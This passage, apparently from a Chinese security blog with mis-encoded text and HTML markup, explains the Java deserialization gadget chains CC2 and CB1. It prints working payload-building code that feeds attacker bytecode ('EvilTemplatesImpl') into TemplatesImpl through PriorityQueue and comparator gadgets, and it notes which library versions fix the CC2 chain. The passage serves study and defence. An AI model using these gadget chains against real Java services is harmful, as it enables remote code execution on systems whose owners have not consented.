&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">CtClass&lt;/span> &lt;span style="color:#111">clazz&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pool&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">evil&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">EvilTemplatesImpl&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">clazz&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toBytecode&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TemplatesImpl&lt;/span> &lt;span style="color:#111">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TemplatesImpl&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_bytecodes&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[][]{&lt;/span>&lt;span style="color:#111">getBytescode&lt;/span>&lt;span style="color:#f92672">()});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_name&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;HelloTemplatesImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_tfactory&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;toString&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Comparator&lt;/span> &lt;span style="color:#111">comparator&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TransformingComparator&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformer&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">PriorityQueue&lt;/span> &lt;span style="color:#111">queue&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">PriorityQueue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">2&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">comparator&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformer&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;iMethodName&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;newTransformer&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">barr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">oos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#111">ois&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">()));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">ois&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="ä¿®å¤">ä¿®å¤&lt;/h3>
&lt;p>è¿™æ¡CC2æ˜¯cc4é™å®šï¼Œå› ä¸º&lt;code>org.apache.commons.collections4.comparators.TransformingComparator&lt;/code>åœ¨ä¹‹å‰ç‰ˆæœ¬æ˜¯æ²¡æœ‰&lt;code>Serializable&lt;/code>æ¥å£çš„ï¼Œæ— æ³•åœ¨åºåˆ—åŒ–ä¸­ä½¿ç”¨&lt;/p>
&lt;p>åœ¨cc3.2.2ç‰ˆä¸­é€šè¿‡æ·»åŠ &lt;code>FunctorUtils#checkUnsafeSerialization&lt;/code>æ¥æ£€æµ‹ååºåˆ—åŒ–æ˜¯å¦å®‰å…¨ï¼Œå¦‚æœæ²¡æœ‰è®¾ç½®&lt;code>org.apache.commons.collections.enableUnsafeSerialization=true&lt;/code>ï¼Œä¼šæŠ›å‡ºå¼‚å¸¸&lt;/p>
&lt;p>è¿™ä¸ªæ£€æŸ¥åœ¨å¸¸è§çš„å±é™©Transformerç±»ï¼ˆInstantiate, Invoker, Prototype, CloneTransformerï¼‰é‡Œçš„readObjectè°ƒç”¨&lt;/p>
&lt;p>åœ¨cc4.1ç‰ˆä¸­ï¼Œè¿™å‡ ä¸ªç±»æ²¡æœ‰Serializableæ¥å£ï¼Œå½»åº•æ— æ³•åºåˆ—åŒ–äº†&lt;/p>
&lt;h2 id="cb1">CB1&lt;/h2>
&lt;p>Commons Beanutilsï¼Œé¡¾åæ€ä¹‰å°è£…äº†å¯¹java beançš„ä¸€äº›æ“ä½œæ–¹æ³•ï¼Œæ¯”å¦‚å¯ä»¥ç›´æ¥è°ƒç”¨java beançš„getteræ–¹æ³•&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">PropertyUtils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Cat&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#d88200">&amp;#34;name&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™é‡Œä¼šè‡ªåŠ¨æ‰¾åˆ°nameå±æ€§çš„æ–¹æ³•ï¼Œå³getNameï¼Œé™¤æ­¤ä¹‹å¤–è¿™ä¸ªæ–¹æ³•è¿˜æ”¯æŒé€’å½’è·å–å±æ€§&lt;/p>
&lt;p>åœ¨ä¸Šé¢çš„CC2ä¸­æˆ‘ä»¬ä½¿ç”¨äº†PriorityQueueï¼Œåœ¨å®ƒçš„æ’åºä¸­æ¶‰åŠåˆ°Comparatoræ¥å£çš„compareæ–¹æ³•ï¼Œæœ€åè§¦å‘transformï¼Œåœ¨CBä¸­ä¹Ÿå­˜åœ¨ä¸€ä¸ªå¯åˆ©ç”¨çš„Comparatorå¯¹è±¡ï¼ŒBeanComparator&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">compare&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">T&lt;/span> &lt;span style="color:#111">o1&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">T&lt;/span> &lt;span style="color:#111">o2&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">property&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">internalCompare&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">o1&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">o2&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">PropertyUtils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">o1&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">property&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">PropertyUtils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">o2&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">property&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">internalCompare&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">value1&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value2&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">IllegalAccessException&lt;/span> &lt;span style="color:#111">var5&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">RuntimeException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;IllegalAccessException: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">var5&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InvocationTargetException&lt;/span> &lt;span style="color:#111">var6&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">RuntimeException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;InvocationTargetException: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">var6&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">NoSuchMethodException&lt;/span> &lt;span style="color:#111">var7&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">RuntimeException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;NoSuchMethodException: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">var7&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¼ å…¥ä¸¤ä¸ªå¯¹è±¡ï¼Œå¦‚æœpropertyä¸ºç©ºåˆ™ç›´æ¥æ¯”è¾ƒå¯¹è±¡ï¼Œå¦åˆ™ç”¨getPropertyå–å‡ºå±æ€§æ¯”è¾ƒï¼Œè°ƒç”¨å¯¹è±¡çš„getter&lt;/p>
&lt;p>å›æƒ³å½“æ—¶TemplatesImplçš„è°ƒç”¨é“¾&lt;/p>
&lt;pre tabindex="0">&lt;code>TemplateImpl#getOutputProperties public
-&amp;gt; TemplateImpl#newTransformer public
-&amp;gt; TemplateImpl#getTransletInstance
-&amp;gt; TemplateImpl#defineTransletClasses
-&amp;gt; TemplateImpl#defineClass default
&lt;/code>&lt;/pre>&lt;p>æ³¨æ„åˆ°&lt;code>getOutputProperties&lt;/code>ï¼Œæ˜¯è§¦å‘åé¢çš„å…³é”®&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">synchronized&lt;/span> &lt;span style="color:#111">Properties&lt;/span> &lt;span style="color:#75af00">getOutputProperties&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">newTransformer&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getOutputProperties&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">TransformerConfigurationException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å®ƒå°±æ˜¯ä¸€ä¸ªgetterï¼è·Ÿå‰é¢çš„ç»“åˆèµ·æ¥&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">PropertyUtils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">o1&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;outputProperties&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å½“o1ä¸ºTemplatesImplå¯¹è±¡æ—¶ï¼Œå°±ä¼šè°ƒç”¨getOutputProperties&lt;/p>
&lt;p>æ„é€ é“¾å­&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.PriorityQueue&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javassist.ClassPool&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.beanutils.BeanComparator&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CommonsBeanutils1&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">field&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
